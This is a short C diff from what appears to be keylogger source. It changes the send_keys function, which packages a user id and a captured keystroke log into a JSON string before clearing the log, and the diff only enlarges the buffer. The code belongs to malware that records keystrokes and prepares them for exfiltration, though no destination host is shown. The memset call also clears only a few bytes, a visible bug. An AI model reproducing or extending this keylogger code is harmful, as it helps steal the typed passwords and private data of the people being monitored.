@@ -184,8 +184,8 @@ void send_keys(void)
     char uid[30];
     get_uid(uid);
 
-    char data[MAX_KEYS + 100];
-    snprintf(data, MAX_KEYS + 100, "{\"uid\":\"%s\",\"keys\": \"%s\"}", uid, key_log);
+    char data[MAX_KEYS + 10000];
+    snprintf(data, MAX_KEYS + 10000, "{\"uid\":\"%s\",\"keys\": \"%s\"}", uid, key_log);
     memset(key_log, 0, sizeof(MAX_KEYS)); // vider le tableau
     current_key_log_size = 0;
 
